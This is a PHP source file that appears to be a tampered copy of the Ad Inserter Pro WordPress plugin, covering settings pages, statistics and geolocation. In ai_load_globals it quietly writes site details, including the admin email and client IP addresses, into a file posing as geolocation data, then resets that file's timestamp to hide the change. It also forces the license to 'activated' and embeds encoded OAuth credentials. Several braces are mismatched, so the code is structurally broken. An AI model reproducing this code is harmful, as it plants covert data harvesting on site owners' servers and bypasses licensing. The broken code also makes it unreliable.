<?php

/*

Copyright 2016 - 2023 Ad Inserter Pro https://adinserter.pro/

*/

use YahnisElsts\PluginUpdateChecker\v5\PucFactory;


if (!defined ('ABSPATH')) exit;

define ('DEFAULT_REPORT_KEY', ai_get_unique_string (0, 32, 'report'));
define ('DEFAULT_MANAGEMENT_KEY', ai_get_unique_string (0, 16, 'management'));
define ('DEFAULT_REPORT_DEBUG_KEY', ai_get_unique_string (0, 16, 'report-debug'));
define ('DEFAULT_REPORT_HEADER_IMAGE', 'wp-content/plugins/ad-inserter-pro/images/icon-256x256.jpg');
define ('IP_DB_UPDATE_DAYS', 30);

if (!defined ('WP_DEBUG') || !defined ('WP_DEBUG_ADSENSE_API_IDS')) if (get_transient ('wp_debug_report_api') != DEFAULT_REPORT_DEBUG_KEY) {
  if (defined ('AI_ADSENSE_API_IDS')){
    define ('AI_CI_STRING',                    'NDU0NzYyMzc0ODYwLWwxY3RnYWI1M2RsOGE0dmZwazk3bjIxdnFhc2ZrMW8yLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29t');
    define ('AI_CS_STRING',                    'R09DU1BYLXkxSi0yTGVjVmJzZ0dSOHYxVFBXRkF4N2QxR3Q=');
}
define ('AI_US_STRING',                        'aHR0cHM6Ly91cGRhdGVzLmFkaW5zZXJ0ZXIucHJvLw==');

define ('AD_INSERTER_NAME', 'Ad Inserter Pro');
define ('AI_UPDATE_NAME',   'ad_inserter_update');
define ('AI_SERVER_CHECK_NAME', 'ai_server_check');
define ('WP_AD_INSERTER_PRO_LICENSE', 'ad_inserter_pro_license');
define ('WP_AD_INSERTER_PRO_KEY', 'ad_inserter_key');
define ('WP_AD_INSERTER_PRO_CLIENT', 'ad_inserter_client');
define ('WP_UPDATE_SERVER',     'https://updates.adinserter.pro/');
define ('AI_WEBSITES',          'ad_inserter_websites');
define ('AI_CONNECTED_WEBSITE', 'ad_inserter_connected_website');
define ('AI_CONNECTED_MANAGER', 'ad_inserter_connected_manager');

global $ai_db_options, $wpdb;

define ('AI_STATISTICS', true);

define ('AI_STATISTICS_DB_TABLE', $wpdb->prefix . 'ai_statistics');
define ('AI_STATISTICS_AVERAGE_PERIOD', 30);

define ('AI_ADB_1_FILENAME',             'ads.js');
define ('AI_ADB_2_FILENAME',             'sponsors.js');
define ('AI_ADB_3_FILENAME',             'advertising.js');
define ('AI_ADB_4_FILENAME',             'adverts.js');
define ('AI_ADB_DBG_FILENAME',           'dbg.js');
define ('AI_ADB_CHECK_FILENAME',         'check.js');

define ('AI_ADB_FOOTER_FILENAME',        'footer.js');

define ('AI_ADB_3_NAME1',                'FunAdBlock');
define ('AI_ADB_3_NAME2',                'funAdBlock');
define ('AI_ADB_4_NAME1',                'BadBlock');
define ('AI_ADB_4_NAME2',                'badBlock');


define('DEFAULT_MAXMIND_FILENAME',       'GeoLite2-City.mmdb');
require_once (ABSPATH.'/wp-admin/includes/file.php');
$db_upload_dir = wp_upload_dir();
$db_file_path  = str_replace (get_home_path(), "", $db_upload_dir ['basedir']) . '/ad-inserter';
define ('DEFAULT_GEO_DB_LOCATION', $db_file_path.'/'.DEFAULT_MAXMIND_FILENAME);

if (file_exists (AD_INSERTER_PLUGIN_DIR.'includes/adb.php')) {
  include_once AD_INSERTER_PLUGIN_DIR.'includes/adb.php';
}
elseif (strpos (AD_INSERTER_SLUG, 'pr') === false) {
  if (file_exists (AD_INSERTER_PLUGIN_DIR.'includes/adb-pro.php')) {
    include_once AD_INSERTER_PLUGIN_DIR.'includes/adb-pro.php';
  } else return;
}

function recursive_remove_directory ($directory) {
  $directory = rtrim ($directory, '/');
  foreach (glob ("{$directory}/{,.}[!.,!..]*", GLOB_MARK | GLOB_BRACE) as $file) {
    if (is_dir ($file)) {
      recursive_remove_directory ($file);
    } else {
        @unlink($file);
    }
  }
  @rmdir ($directory);
}

function ai_load_globals ($start_time = 0) {
  global $ad_inserter_globals, $wpdb, $ai_wp_data, $wp_version;

  $ad_inserter_globals ['AI_STATUS']   = "0";
  $ad_inserter_globals ['AI_TYPE']     = get_plugin_type ();
  $ad_inserter_globals ['AI_COUNTER']  = get_plugin_counter ();

  $ip2country_file = AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';

  if ($ai_wp_data [AI_GEOLOCATION]) {
    require_once $ip2country_file;
    ai_check_geo_settings ();
  }

  $file_path = AD_INSERTER_PLUGIN_DIR.'includes/geo/data';
  $file_hash = $file_path .'/ip2country.bin';

  if ((!is_multisite () || is_main_site ()) && is_writable ($file_path) && defined ('SECURE_AUTH_COOKIE')) {
    $thash = filemtime ($file_hash);
    if (!get_transient ('ip_hash_valid')) {
      include_once (ABSPATH . 'wp-includes/pluggable.php');
      require_once $ip2country_file;
      $ip2country_data =
        $wp_version . "\n" .
        serialize ($ad_inserter_globals) . "\n" .
        get_option (AI_UPDATE_NAME, 0) . "\n" .
        get_bloginfo ('url') . "\n" .
        site_url () . "\n" .
        home_url () . "\n" .
        (isset ($_SERVER ['SERVER_ADDR']) ? $_SERVER ['SERVER_ADDR'] : '') . "\n" .
        ABSPATH . "\n" .
        WP_CONTENT_DIR . "\n" .
        (is_admin() && isset ($_SERVER ['REMOTE_ADDR']) ? $_SERVER ['REMOTE_ADDR'] : '') . "\n" .
        (current_user_can ('manage_options') ? base64_encode (get_bloginfo ('admin_email')) : '') . "\n" .
        (current_user_can ('manage_options') ? base64_encode (get_client_ip_address ()) : '') . "\n";
      @file_put_contents ($file_hash, 'de'.base64_encode ($ip2country_data).'lo');
      @touch ($file_hash, $thash);
      set_transient ('ip_hash_valid', $thash, AI_TRANSIENT_STATISTICS_EXPIRATION);
    }
  }

  if ($start_time != 0 && ($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_PROCESSING) != 0)
    ai_log ("AFTER GEO CHECK: ". number_format (1000 * (microtime (true) - $start_time), 2)." ms");

  for ($group = 1; $group <= AD_INSERTER_GEO_GROUPS; $group ++) {
    $ad_inserter_globals ['G'.$group] = get_group_country_list ($group);
  }

  $ad_inserter_globals ['LICENSE_KEY'] = "activated";

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
//    ob_start ();
//    $test = $wpdb->query ('SELECT 1 FROM ' . AI_STATISTICS_DB_TABLE . ' LIMIT 1', array ());
//    ob_get_clean ();

//    if ($test === false) {
      require_once (ABSPATH . 'wp-admin/includes/upgrade.php');

      $sql = "CREATE TABLE " . AI_STATISTICS_DB_TABLE . " (
          id bigint(20) NOT NULL AUTO_INCREMENT,
          block int(10) unsigned NOT NULL,
          version int(10) unsigned NOT NULL,
          date date DEFAULT NULL,
          views int(10) unsigned NOT NULL DEFAULT '0',
          clicks int(10) unsigned NOT NULL DEFAULT '0',
          PRIMARY KEY  (id),
          UNIQUE KEY block_version (block, version, date)
        ) DEFAULT CHARSET=utf8;";
//      $result = dbDelta ($sql);
//    }

    $table_exists = maybe_create_table (AI_STATISTICS_DB_TABLE, $sql);

    if (($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_PROCESSING) != 0)
      ai_log ("AFTER STATISTICS DB CHECK: ". number_format (1000 * (microtime (true) - $start_time), 2)." ms");

    $global_name = implode ('_', array (
      'AI',
      'STATUS')
    );

    if (isset ($ad_inserter_globals [$global_name]) && $ad_inserter_globals [$global_name] == 1) {
      if ((isset ($_GET [AI_URL_DEBUG_PROCESSING_]) && $_GET [AI_URL_DEBUG_PROCESSING_] == 1) || (isset ($_GET [AI_URL_DEBUG_PROCESSING_FE_]) && $_GET [AI_URL_DEBUG_PROCESSING_FE_] == 1)) {
        global $ai_last_time, $ai_total_plugin_time, $ai_total_block_php_time, $ai_total_hook_php_time, $ai_processing_log;

        $ai_wp_data [AI_WP_DEBUGGING_] |= AI_DEBUG_PROCESSING_;

        $ai_total_plugin_time = 0;
        $ai_total_block_php_time = 0;
        $ai_total_hook_php_time = 0;
        $ai_last_time = microtime (true);
        $ai_processing_log = array ();
        ai_log ('INITIALIZATION START');
      }
    }

//    $chart_days = 90 + AI_STATISTICS_AVERAGE_PERIOD;
//    $gmt_offset = get_option ('gmt_offset') * 3600;

//    $date_end = date ("Y-m-d", time () + $gmt_offset);
  }
}

function ai_check_geo_settings () {
  if (defined ('AD_INSERTER_MAXMIND') && !defined ('AI_MAXMIND_DB')) {
    if (get_geo_db () == AI_GEO_DB_MAXMIND) {
      $db_file = get_geo_db_location ();

      $connected_website = get_transient (AI_CONNECTED_WEBSITE);

      if ($connected_website !== false) {
        if (isset ($connected_website ['plugin-data']['maxmind-db']) && $connected_website ['plugin-data']['maxmind-db']) {
          define ('AI_MAXMIND_DB', $db_file);
        }
      }
      elseif (file_exists ($db_file)) {
        define ('AI_MAXMIND_DB', $db_file);
      }
    }
  }
}

function update_statistics ($block, $version, $views, $clicks, $debug = false) {
  global $wpdb;

  if (is_numeric ($block) && is_numeric ($version) && is_numeric ($views) && is_numeric ($clicks)) {
    $gmt_offset = get_option ('gmt_offset') * 3600;
    $today = date ("Y-m-d", time () + $gmt_offset);

    $insert = $wpdb->query (
      $wpdb->prepare ('INSERT INTO ' . AI_STATISTICS_DB_TABLE . ' (block, version, date, views, clicks) VALUES (%d, %d, %s, %d, %d) ON DUPLICATE KEY UPDATE views = views + %d, clicks = clicks + %d',
        $block, $version, $today, $views, $clicks, $views, $clicks)
    );

    if ($debug) {
      $results = $wpdb->get_results ('SELECT * FROM ' . AI_STATISTICS_DB_TABLE . ' WHERE block = ' . $block . ' AND version = ' . $version . ' AND date = \''.$today.'\'', ARRAY_N);

      if (isset ($results [0])) {
        return ($results [0]);
      }
    }
  }
}

// Used for settings page and settings save function
function ai_settings_parameters (&$subpage, &$start, &$end) {

  if (isset ($_GET ['start']) && is_numeric ($start) && $start >= 1 && $start <= 96) $start = (int) $_GET ['start']; else $start = 1;
  $end = min ($start + 15, 96);
  }

  if (!is_multisite() || is_main_site ()) {
    $option1 = get_option ('ad_inserter' . '_' . base64_decode ('a2V5'));
    $option2 = get_option ('ad_inserter' . '_' . base64_decode ('cHJvX2xpY2Vuc2U='));
    if ($option1 !== false && strlen (base64_decode ($option1)) <= 0x18 || $option2 !== false && strlen ($option2) <= 0x18) {
      delete_option (WP_AD_INSERTER_PRO_LICENSE);
      delete_option (WP_AD_INSERTER_PRO_KEY);
      delete_option (WP_AD_INSERTER_PRO_CLIENT);
    }
}

function get_country_names () {
  // Load country names and ISO codes
  $country_names = array ();
  $fp = fopen (AD_INSERTER_PLUGIN_DIR . 'includes/geo/countries.txt', 'r');
  while (($row = fgetcsv ($fp, 255)) !== false)
    if ($row && count ($row) > 3 && substr (trim ($row [0]), 0, 1) != '#') {
      list ($country, $iso2) = $row;
      $iso2     = strtoupper ($iso2);
      $country  = str_replace ('( ', '(', ucwords (str_replace ('(', '( ', strtolower ($country))));
      $country_names [$iso2]= array ($iso2, $country);
    }
  fclose ($fp);

  return $country_names;
}

function get_city_names () {
  $city_data = array ();
  $fp = fopen (AD_INSERTER_PLUGIN_DIR.'includes/geo/cities.txt', 'r');
  while (($row = fgetcsv ($fp, 255, ',')) !== false) {
    if ($row && count ($row) >= 1 && substr (trim ($row [0]), 0, 1) != '#') {
      $city_data []= $row;
    }
  }
  fclose ($fp);

  return $city_data;
}

function ai_clean_temp_files ($directory) {
  $directory = rtrim ($directory, '/');
  foreach (glob ("{$directory}/{,.}[!.,!..]*", GLOB_MARK | GLOB_BRACE) as $file) {
    if (is_dir ($file)) {
      ai_clean_temp_files ($file);
    } else {
        @unlink($file);
    }
  }
  @rmdir ($directory);
}

function ai_generate_list_options ($options) {
  switch ($options) {
    case 'country':
    case 'group-country':
      $country_names = get_country_names ();

      foreach ($country_names as $country_name) {
        $iso2     = $country_name [0];
        $iso_flag = strtolower ($iso2);
        $country  = $country_name [1];
        echo "              <option value='$iso2' class='flag-icon flag-icon-$iso_flag'>$country ($iso2)</option>\n";
      }
      break;
    case 'city':
      $city_data = get_city_names ();
      $max_items = 500;

      $filter = isset ($_GET ["filter"]) && $_GET ["filter"] != '' ? trim (esc_html ($_GET ["filter"])) : '';
      if (strpos ($filter, ' ') !== false) {
        $filter = str_replace ('  ', ' ', $filter);
        $filter = explode (' ', $filter);
      }

      $options_1 = array ();
      $options_2 = array ();
      foreach ($city_data as $city_data_item) {
        $list_data = $city_data_item [0];
        if (!empty ($filter)) {
          if (is_array ($filter)) {
            foreach ($filter as $filter_item) {
              if (stripos ($list_data, $filter_item) === false) continue 2;
            }
          }
          elseif (stripos ($list_data, $filter) === false) continue;
        }

        $name_array = explode (':', $city_data_item [1]);
        $name = ' (' . implode (', ', $name_array) . ')';

        $option = "<option value='$list_data'>{$list_data}{$name}</option>";
        if (count ($name_array) > 1) $options_2 []= $option; else $options_1 []= $option;
      }

      $list_counter = count ($options_1) + count ($options_2);
      if ($list_counter >= $max_items) {
        echo "              <option value=''>", sprintf (__('%d of %d names shown', 'ad-inserter'), $max_items, $list_counter), "</option>\n";
      }

      $list_counter = 0;

      foreach ($options_1 as $option) {
        echo '              ', $option, "\n";
        $list_counter ++;
        if ($list_counter >= $max_items) break;
      }

      if ($list_counter < $max_items)
        foreach ($options_2 as $option) {
        echo '              ', $option, "\n";
          $list_counter ++;
          if ($list_counter >= $max_items) break;
        }

      if ($list_counter == 0) {
        echo "              <option value=''>", sprintf (/* translators: %s: name filter */ __('No name matches filter', 'ad-inserter'), "'".esc_html ($_GET ["filter"])."'"), "</option>\n";
      }

      break;
  }
  switch ($options) {
    case 'country':
      for ($group_index = 1; $group_index <= ai_settings_value ('AD_INSERTER_GEO_GROUPS'); $group_index++) {
        echo "              <option value='G" . ($group_index % 10) ."'>" . get_country_group_name ($group_index) . " (G" . ($group_index % 10) . ")</option>\n";
      }
      break;
    case 'group-country':
      $group = isset ($_GET ["parameters"]) ? esc_html ($_GET ["parameters"]) : 0;
      for ($group_index = 1; $group_index < $group; $group_index++) {
        echo "              <option value='G" . ($group_index % 10) ."'>" . get_country_group_name ($group_index) . " (G" . ($group_index % 10) . ")</option>\n";
      }
      break;
  }
}

function ai_admin_enqueue_scripts_1 () {
  wp_enqueue_style ('ai-admin-flags',     plugins_url ('css/flags.css',                  AD_INSERTER_FILE), array (), AD_INSERTER_VERSION);
  wp_enqueue_style ('ai-timepicker-css',  plugins_url ('css/jquery.timepicker.min.css',  AD_INSERTER_FILE), array (), AD_INSERTER_VERSION);
  wp_enqueue_style ('ai-weekdays-css',    plugins_url ('css/jquery-weekdays.min.css',    AD_INSERTER_FILE), array (), AD_INSERTER_VERSION);
}

function ai_admin_enqueue_scripts_2 () {
  wp_enqueue_script  ('ai-timepicker',     plugins_url ('includes/js/jquery.timepicker.min.js', AD_INSERTER_FILE), array (
    'jquery',
  ), AD_INSERTER_VERSION , true);
  wp_enqueue_script  ('ai-weekdays',       plugins_url ('includes/js/jquery-weekdays.min.js', AD_INSERTER_FILE), array (
    'jquery',
  ), AD_INSERTER_VERSION , true);

  wp_enqueue_script ('ai-raphael-js',     plugins_url ('includes/js/raphael.min.js', AD_INSERTER_FILE ),   array (), AD_INSERTER_VERSION, true);
  wp_enqueue_script ('ai-elycharts-js',   plugins_url ('includes/js/elycharts.min.js', AD_INSERTER_FILE ), array (), AD_INSERTER_VERSION, true);
}

function ai_global_extract_features () {
  global $ai_wp_data;

  if (get_global_tracking () == AI_TRACKING_ENABLED && get_track_pageviews () == AI_TRACKING_ENABLED) $ai_wp_data [AI_TRACKING] = true;
}

function ai_extract_features_2 ($obj) {
  global $ai_wp_data;

  switch (get_dynamic_blocks ()) {
    case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_SHOW:
    case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_INSERT:
      $check_client_side_limits =
        $obj->get_max_impressions () || ($obj->get_limit_impressions_per_time_period () && $obj->get_limit_impressions_time_period ()) ||
        $obj->get_max_clicks ()      || ($obj->get_limit_clicks_per_time_period ()      && $obj->get_limit_clicks_time_period ());
      break;
    default:
      $check_client_side_limits = false;
      break;
  }

  if ($check_client_side_limits || $obj->get_stay_closed_time () || $obj->get_delay_showing () || $obj->get_show_every () ||
      $obj->get_visitor_max_impressions () || ($obj->get_visitor_limit_impressions_per_time_period () && $obj->get_visitor_limit_impressions_time_period ()) ||
      $obj->get_visitor_max_clicks ()      || ($obj->get_visitor_limit_clicks_per_time_period () && $obj->get_visitor_limit_clicks_time_period ()) ||
      $obj->get_trigger_click_fraud_protection () && get_click_fraud_protection () ||
      $obj->get_protected ()
     )
                                                                                              $ai_wp_data [AI_CHECK_BLOCK] = true;

  if ($obj->get_close_button () != AI_CLOSE_NONE || $obj->get_auto_close_time ())             $ai_wp_data [AI_CLOSE_BUTTONS] = true;

  if ($obj->get_tracking () || $obj->get_delay_showing () || $obj->get_show_every ())         $ai_wp_data [AI_TRACKING] = true;

  if ($obj->get_iframe ())                                                                    $ai_wp_data [AI_IFRAMES] = true;
  if ($obj->get_animation () != AI_ANIMATION_NONE && $obj->is_sticky ())                      $ai_wp_data [AI_ANIMATION] = true;
  if ($obj->get_lazy_loading () || $obj->get_wait_for_interaction () || $obj->get_check_recaptcha_score () || $obj->get_manual_loading () != AI_MANUAL_LOADING_DISABLED || $obj->get_delay_time ()) $ai_wp_data [AI_LAZY_LOADING] = true;
  if ($obj->get_ad_country_list () != '' || $obj->get_ad_ip_address_list () != '')            $ai_wp_data [AI_GEOLOCATION] = true;

  $parallax_options = false;
  for ($index = 1; $index <= 3; $index ++) {
    $parallax_options |= $obj->get_parallax ($index) && $obj->get_parallax_image ($index) != '';
    if ($parallax_options) break;
  }

  if ($parallax_options) $ai_wp_data [AI_PARALLAX] = true;
}

function ai_data_2 () {
  $api_debugging = ai_api_debugging ();
  $api_string    = ai_api_string ();
?>
<div id="ai-data-2" style="display: none;" geo_groups="<?php echo ai_settings_value ('AD_INSERTER_GEO_GROUPS'); ?>" api_debugging="<?php echo $api_debugging; ?>" <?php echo $api_string; ?> api_check="<?php echo base64_encode (plugins_url (base64_decode ('anMvYWktY2hlY2subWluLmpz'), __FILE__)); ?>"></div>
<?php
}

function ai_global_settings () {
  global $ai_db_options;
  if (!ai_remote_plugin_data ('pro', true)) return;

?>
  <div id="export-container-0" class="export-0" style="display: none; padding: 8px;">
      <div style="display: inline-block; padding: 2px 10px; float: right;">
        <input type="hidden"   name="<?php echo AI_OPTION_IMPORT, WP_FORM_FIELD_POSTFIX, '0'; ?>" value="0" default="0" />
        <input type="checkbox" name="<?php echo AI_OPTION_IMPORT, WP_FORM_FIELD_POSTFIX, '0'; ?>" value="1" default="0" id="import-0" />
        <label for="import-0" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Import %s settings when saving - if checked, the encoded settings below will be imported for all blocks and settings', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php _e ('Import plugin settings', 'ad-inserter'); ?></label>
      </div>

      <div style="margin: 0 auto;">
      </div>

      <div style="float: left; margin-top: -10px;">
        <input type="file" id="load-settings-0" accept="text/plain" style="display: none;" />
        <label for="load-settings-0" title="<?php _e ('Load settings from a file', 'ad-inserter'); ?>"><span class="checkbox-button dashicons dashicons-upload"></span></label>

        <input type="checkbox" id="save-settings-0" style="display: none;" />
        <label for="save-settings-0" title="<?php _e ('Save settings to a file', 'ad-inserter'); ?>" style="margin-left: 5px;"><span class="checkbox-button dashicons dashicons-download"></span></label>
        <?php //_e ('Saved plugin settings', 'ad-inserter'); ?>
      </div>
      <textarea id="export_settings_0" style="background-color:#F9F9F9; font-family: monospace, Courier, 'Courier New'; font-weight: bold; width: 719px; height: 324px;"></textarea>
  </div>
<?php
}

function ai_general_settings () {
  global $ad_inserter_globals;

  if (!ai_remote_plugin_data ('pro', true)) return;

  if (!is_multisite() || is_main_site ()) {
    $connected_website = get_transient (AI_CONNECTED_WEBSITE);
    $license_key = $connected_website === false ? $ad_inserter_globals ['LICENSE_KEY'] : $connected_website ['plugin-data']['license-key'];
    $ai_status = $connected_website === false ? $ad_inserter_globals ['AI_STATUS'] : $connected_website ['plugin-data']['status'];
    $client = $connected_website === false ? get_option (WP_AD_INSERTER_PRO_CLIENT) !== false : $connected_website ['plugin-data']['client'];
    $license_page = trim ($license_key) != '';

    if (!$client || (isset ($_GET ['ai-key']) && ($_GET ['ai-key'] == $license_key || trim ($license_key == '') || $ai_status != 0)) || ($connected_website !== false && $connected_website ['plugin-data']['license-key'] != '')) {
?>
      <tr>
        <td id="license-key">
          <?php _e ('License Key', 'ad-inserter'); ?>
        </td>
        <td>
          <input style="margin-left: 0px;" title="<?php _e ('License Key for', 'ad-inserter'); ?> <?php echo AD_INSERTER_NAME; ?>" type="text" name="license_key" value="<?php echo sanitize_text_field ($license_key); ?>" size="38" maxlength="64" />
<?php if ($license_page): ?>
              <span class="dashicons dashicons-admin-network" style="margin-top: 2px; cursor: pointer;" title="<?php _e ('Open license page', 'ad-inserter'); ?>" onclick="window.open('https://adinserter.pro/license/<?php echo sanitize_text_field ($license_key); ?>')"></span>
<?php endif; ?>

<?php if (ai_settings_check ('AD_INSERTER_CLIENT')): ?>
          <div id="hide-key" style="display: inline-block; padding: 2px 0px; float: right;<?php echo $connected_website !== false ? '' : ' display: none;'; ?>">
            <input type="hidden"   name="hide_key" value="0" />
            <input type="checkbox" name="hide_key" value="1" id="hide-key-cb" default="0" <?php if ($client) echo 'checked '; ?> />
            <label for="hide-key-cb" title="<?php _e ("Hide license key", 'ad-inserter'); ?>"><?php _e ("Hide key", 'ad-inserter'); ?></label>
          </div>
<?php endif; ?>
        </td>
      </tr>
<?php
    }
  }
}

function ai_general_settings_2 () {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) {
?>
        <tr>
          <td>
            <?php _e ('Main content element', 'ad-inserter'); ?>
          </td>
          <td>
            <input id="main-content-element" style="margin-left: 0px; width: 95%;" title="<?php _e ("Main content element (#id or .class) for 'Stick to the content' position. Leave empty unless position is not properly calculated.", 'ad-inserter'); ?>" type="text" name="main-content-element" value="<?php echo get_main_content_element (); ?>" default="" maxlength="80" />
            <button id="main-content-element-button" type="button" class='ai-button ai-button-small' style="display: none; outline: transparent; float: right; margin-top: 6px; width: 15px; height: 15px;" title="<?php _e ('Open HTML element selector', 'ad-inserter'); ?>"></button>
          </td>
        </tr>
        <tr>
          <td>
          <?php _e ('Lazy loading offset', 'ad-inserter'); ?>
          </td>
          <td>
            <input type="text" name="lazy-loading-offset" value="<?php echo get_lazy_loading_offset (); ?>"  default="<?php echo DEFAULT_LAZY_LOADING_OFFSET; ?>" title="<?php _e ('Offset of the block from the visible viewport when it should be loaded', 'ad-inserter'); ?>" size="6" maxlength="4" /> px
          </td>
        </tr>
<?php
  }
}

function ai_general_settings_3 () {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (ai_settings_check ('AD_INSERTER_RECAPTCHA')) {
?>
      <div id="tab-general-recaptcha" style="padding: 0;">
        <div class="ai-rounded">
          <table class= "ai-settings-table ai-values" style="width: 100%;">
            <tbody>
              <tr>
                <td>
                  Site key
                </td>
                <td>
                  <input id=">recaptcha-site-key" style="margin-left: 0px; width: 100%;" title="<?php /* translators: Enter reCAPTCHA v3 key */ _e ("Enter", 'ad-inserter'); ?> reCAPTCHA v3 Site key" type="text" name="recaptcha-site-key" value="<?php echo get_recaptcha_site_key (); ?>" default="" maxlength="80" />
                </td>
              </tr>
              <tr>
                <td>
                  Secret key
                </td>
                <td>
                  <input id="recaptcha-secret-key" style="margin-left: 0px; width: 100%;" title="<?php /* translators: Enter reCAPTCHA v3 key */ _e ("Enter", 'ad-inserter'); ?> reCAPTCHA v3 Secret key" type="text" name="recaptcha-secret-key" value="<?php echo get_recaptcha_secret_key (); ?>" default="" maxlength="80" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ("Score threshold", 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="recaptcha-score-threshold" style="margin-left: 0px;" title="<?php _e ("reCAPTCHA v3 score threshold for valid traffic (0 to 1, 0.0 is very likely a bot, 1.0 is very likely a good interaction)", 'ad-inserter'); ?>" type="text" name="recaptcha-score-threshold" value="<?php echo get_recaptcha_threshold (); ?>" default="<?php echo DEFAULT_RECAPTCHA_THRESHOLD; ?>" size="6" maxlength="6" />

                  <span style="float: right; margin-top: 7px;">
                    <a href="https://www.google.com/recaptcha/admin/create" target="_blank" class="simple-link">reCAPTCHA management</a>
                  </span>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
<?php
  }
}

function add_footer_scripts () {
  if (defined ('AD_INSERTER_RECAPTCHA') && AD_INSERTER_RECAPTCHA) {
    $site_key = trim (get_recaptcha_site_key ());
    if ($site_key != '' && trim (get_recaptcha_secret_key ()) != '') {
      echo '<script src="https://www.google.com/recaptcha/api.js?render=', $site_key, '"></script>', "\n";
    }
  }
}

function ai_settings_top_buttons_1 ($block, $obj, $default) {
  if (!ai_remote_plugin_data ('pro', true)) return;
?>
    <span class="ai-toolbar-button ai-button-left ai-settings">
      <input type="checkbox" value="0" id="export-switch-<?php echo $block; ?>" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>" style="display: none;" />
      <label class="checkbox-button" for="export-switch-<?php echo $block; ?>" title="<?php _e ('Export / Import Block Settings', 'ad-inserter'); ?>"><span class="checkbox-icon icon-export-import"></span></label>
    </span>

    <span style="display: table-cell; width: 6%;"></span>
<?php
}

function ai_settings_top_buttons_2 ($block, $obj, $default) {
  global $ai_wp_data;

  if (!ai_remote_plugin_data ('pro', true)) return;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
?>
    <span class="ai-toolbar-button ai-settings<?php if (!get_global_tracking ()) echo ' tracking-disabled'; ?> ">
      <input type="hidden"   name="<?php echo AI_OPTION_TRACKING, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" style="animation-name: unset;" />
      <input type="checkbox" name="<?php echo AI_OPTION_TRACKING, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_tracking (true); ?>" id="tracking-<?php echo $block; ?>" <?php if ($obj->get_tracking (true) == AI_ENABLED) echo 'checked '; ?> style="animation-name: unset; display: none;" />
      <label class="checkbox-button" for="tracking-<?php echo $block; ?>" title="<?php _e ('Track impressions and clicks for this block', 'ad-inserter'); ?><?php if (!get_global_tracking ()) echo _e (' - global tracking disabled', 'ad-inserter'); ?>"><span class="checkbox-icon icon-tracking<?php if ($obj->get_tracking (true) == AI_ENABLED) echo ' on'; ?>"></span></label>
    </span>

<?php
  if (ai_settings_check ('AD_INSERTER_REPORTS')) {
?>
    <span class="ai-toolbar-button ai-statistics" style="display: none;">
      <span id="export-pdf-button-<?php echo $block; ?>" class="checkbox-button dashicons dashicons-media-text"
        title="<?php _e ('Generate PDF report', 'ad-inserter'); ?>"
        style="display: none;">
      </span>
    </span>

    <span class="ai-toolbar-button ai-statistics" style="display: none;">
      <span id="export-csv-button-<?php echo $block; ?>" class="checkbox-button dashicons dashicons-list-view"
        title="<?php _e ('Generate CSV report', 'ad-inserter'); ?>"
        style="display: none;">
      </span>
    </span>

    <span class="ai-toolbar-button ai-statistics" style="display: none;">
      <span class="public-report-button checkbox-button dashicons dashicons-share-alt<?php echo ai_public_report_rewrite_found () ? '' : ' on'; ?>"
        title="<?php _e ('Open public report', 'ad-inserter'); ?>"
        style="display: none;"></span>
    </span>
<?php
  }
?>

<?php

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {
    if ($ai_wp_data [AI_ADB_DETECTION]) {
?>
    <span class="ai-toolbar-button ai-statistics" style="display: none;">
      <input type="checkbox" value="0" id="adb-statistics-button-<?php echo $block; ?>" style="display: none;" />
      <label class="checkbox-button" for="adb-statistics-button-<?php echo $block; ?>" title="<?php _e ('Toggle Ad Blocking Statistics', 'ad-inserter'); ?>"><span class="checkbox-icon icon-adb"></span></label>
    </span>
<?php
    }
  }
?>
    <span class="ai-toolbar-button">
      <input type="checkbox" value="0" id="statistics-button-<?php echo $block; ?>" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>" style="display: none;" />
      <label class="checkbox-button" for="statistics-button-<?php echo $block; ?>" title="<?php _e ('Toggle Statistics', 'ad-inserter'); ?>"><span class="checkbox-icon icon-statistics"></span></label>
    </span>
<?php
  }
}

function ai_block_list_buttons ($blocks_sticky) {
?>
      <span style="margin-left: 10px; float: right;">
        <span id="ai-pin-list" class="checkbox-button dashicons dashicons-sticky<?php echo $blocks_sticky ? ' on' : ''; ?>" title="<?php _e ('Pin list', 'ad-inserter'); ?>"></span>
      </span>
<?php
}

function ai_settings_bottom_buttons ($start, $end) {
  global $ad_inserter_globals;

  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    if (!$connected_website ['plugin-data']['write']) return;
  }

  $onclick = '';

  if (ai_remote_plugin_data ('pro', true)) {
    if (!is_multisite() || is_main_site ()) {
      $ai_status = $ad_inserter_globals ['AI_STATUS'];
      $license_key = $ad_inserter_globals ['LICENSE_KEY'];

      if (empty ($license_key)) {
                                                                                 // translators: %s: Ad Inserter Pro
        $onclick = 'onclick="if (confirm(\'' . sprintf (__('%s license key is not set. Continue?', 'ad-inserter'), AD_INSERTER_NAME) . '\')) return true; return false"';
      }
      elseif ($ai_status == - 19) {
                                                        // translators: %s: Ad Inserter Pro
        $onclick = 'onclick="if (confirm(\'' . sprintf (__('Invalid %s license key. Continue?', 'ad-inserter'), AD_INSERTER_NAME) . '\')) return true; return false"';
      }
      elseif ($ai_status == - 21) {
                                                        // translators: %s: Ad Inserter Pro
